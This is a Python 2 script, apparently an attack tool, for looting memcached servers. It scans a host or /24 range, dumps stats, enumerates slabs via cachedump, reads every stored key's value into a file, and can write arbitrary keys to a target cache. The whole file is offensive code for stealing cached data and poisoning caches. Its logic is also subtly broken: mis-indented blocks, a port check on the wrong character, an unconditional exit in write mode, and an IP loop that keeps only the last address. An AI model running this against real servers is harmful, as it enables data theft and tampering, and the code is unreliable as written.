import os
import sys
import socket
import argparse
from IPy import IP

"""
#  Parse Command line args 
"""
mode_info = "info"
mode_loot = "loot"
mode_write = "write"
LOOTMODE = [mode_info, mode_loot, mode_write]


def cmd():
  parser = argparse.ArgumentParser(description="Simple looting tool for memcached services") 
  parser.add_argument("-t","--target", required=True, help="Specify target. It can be single host, or range of hosts, separated by hyphen. For now, only /24 nets are supported")
  parser.add_argument("-p","--port", default ="11211", help="Specify target port. By default 11211 is used\n")
  parser.add_argument("-m","--mode", default = mode_info, choices=LOOTMODE, help="Specify working mode. By default it tries to read all the possible data")
  parser.add_argument("-k","--key", default = None, help="Required only for %s mode. Key to write data to" % (mode_write))
  parser.add_argument("-v","--value", default = None, help="Required only for %s mode. Data to write for specified key" % (mode_write))
  parser.add_argument("-o","--output", help="File to write the output")

  args= parser.parse_args()

  # Parse & Check target host.  
  target = args.target
  port = args.port
  try:
    int(port[1])
  except ValueError:
    print "[-]Incorrect port number: %s" % (port)
    sys.exit(-1)
  if not 0 <= int(port) <= 65535:
    print "[-]Incorrect port number: %s" % (port)
    sys.exit(-1)
  # Maybe to perform some additional checks here.  

  # Create adequate checks for IP addresses.  
  IP_oct = target.split(".")
  ipList = []
  # Splitting second octed. Mask /24.  
  mask_24 = IP_oct[3].split("-")
  if len(mask_24) == 1:
    ipList.append(target)
  else: 
    ranges_count = len(mask_24)/2
    # TODO: Add parsing of other masks /16 /8 /0.   
    # TODO: Add parsing of hosts, separated by comma.  
    for i in xrange(int(mask_24[0]), int(mask_24[1])):
      ip = ".".join((IP_oct[0], IP_oct[1], IP_oct[2], str(i)))
      try:
       IP(ip)
      except ValueError:
        print "[-]Incorrect ip address: %s" % (ip)
        sys.exit(-1)
    ipList.append(ip)

  mode = args.mode

  key, value = None, None
  if (mode == mode_write):
    key, value = args.key, args.value
    if (key == None) or (value == None):
      print "[-] Key and Value to write must be specified"
    sys.exit(-1)
    if (len(ipList) > 1):
      print "[-]Write command could only be performed to a single host"
      sys.exit(-1)

  output = args.output
  if (mode != mode_write) and (output == None):
    print "[-] Output must be specified for mode %s" % (mode)
    sys.exit(-1)
  print "[!] Working mode: %s" % (mode)
  print "[!] Target host(s): %s" % (target)
  print "[!] Target port: %s" % (port)
  return (ipList,int(port),mode,key,value,output)


def parse_slabs(resp):
  # The value, followed by "items" is slab number.  
  # STAT items:1:number 3\r\n  
  # ...  
  # STAT items:2:number 11\r\n  
  # ...  
  # STAT items:3:number 1\r\n  
  # ...  
  # END\r\n  
  resp_list = resp.split("\r\n")[:-2]  # [:-2] Because of END\r\n line. 
  return list(set([x.strip("STAT ").split(":")[1] for x in resp_list]))


def parse_key(resp):
  key, value = None, None
  resp_list = resp.split("\r\n")
  try:
    # Key is stored on first line. 
    # VALUE <key> 0 <len(value)>\r\n  
    # <value>\r\n  
    # END\r\n  
    key = resp_list[0].split(" ")[1]
    # And value is stored on second line  
    value = resp_list[1]
  except:
    return None, None
  return key, value


def parse_stat(resp):
  # STAT pid <pid>\r\n  
  # STAT uptime <uptime>\r\n  
  # ...  
  # END\r\n  
  resp_list = resp.split("\r\n")[:-2]  # [:-2] Because of END\r\n line. 
  return [x.strip("STAT ").split(" ") for x in resp_list]


if __name__ == "__main__":
  ipList, port, mode, key_to_write, value_to_write, output = cmd()
  toFile = False
  if output != None:
    toFile = True
    try:
      f = open(output,"w+")
    except Exception:
      print "\t[-] Filename is not valid: %s" % (output)
      sys.exit(-1)
  socket.setdefaulttimeout(3)

  if mode == mode_info:
    for ip in ipList:
      print "\t[!] Getting info on MemCache from %s" % ip
      if toFile: f.write("\r\n[!] %s\r\n" % ip)
      s = socket.socket()
      s.connect((ip,port))
      # Dumb retrieval of memcached statistic.  
      mc_cmd = "stats\r\n"  # Command to retrieve statistic. 
      s.send(mc_cmd)
      resp = s.recv(4096)
      parse_stat(resp)
      if toFile: 
        f.write("[!] Stats:\r\n")
        for line in parse_stat(resp):
          f.write("\t[+] %s : %s\r\n" % (line[0], line[1]))
        f.close()
      s.close()
  if mode == mode_loot:
    keys = []
    for ip in ipList:
      print "\t[!] Looting MemCached on %s" % ip
      if toFile: f.write("\r\n[!] %s\r\n" % ip)
      s = socket.socket()
      s.connect((ip,port))
      # First of all, we try to read all the slabs, that can store valuable data.   
      mc_cmd = "stats items\r\n"  # Command for retrieving info for all existing slabs. 
      s.send(mc_cmd)
      resp = ""
      resp = s.recv(4096)
      # Second thing is to read

      slabs = parse_slabs(resp)
      # Second, we try to get all stored keys from each founded slab.  
        for slab in slabs:   
        mc_cmd = "stats cachedump %s 0\r\n" % (slab)  # Command for retrieving all the cached keys from a single slab.
        s.send(mc_cmd)
        resp = ""
        resp = s.recv(1024)
        for item in resp.split("\r\n")[:-2]:  # [:-2] Because of END\r\n line.  
          keys.append(item.split(" ")[1])
        print "\t\t[+]Found %d items in slab %s: %s" % (len(keys), slab, ", ".join((keys)))
        # And last, we"ll try to read each key"s value.  
        for key in keys:
          mc_cmd = "get %s\r\n" % (key)  # Command to retrieve specified"s key value. 
          s.send(mc_cmd)
          resp = s.recv(1024)
          if toFile: f.write("\t[+] %s : %s\r\n" % (parse_key(resp)))
        s.close()
        if toFile: f.close()

  if mode == mode_write:
    s = socket.socket()
    s.connect((ipList[0],port))
    # Set key:value to store for 900000ms (some random int).   
    mc_cmd = "set %s 0 900000 %d\r\n%s\r\n" % (key_to_write, len(value_to_write), value_to_write)
    print mc_cmd
    try:
      s.send(mc_cmd) 
      resp = s.recv(1024)
      print "[+] %s" % resp
    except socket.timeout:
      print "[-] Timeout occured"
      sys.exit(-1)
    except socket.error,e:
      print e
      sys.exit(-1)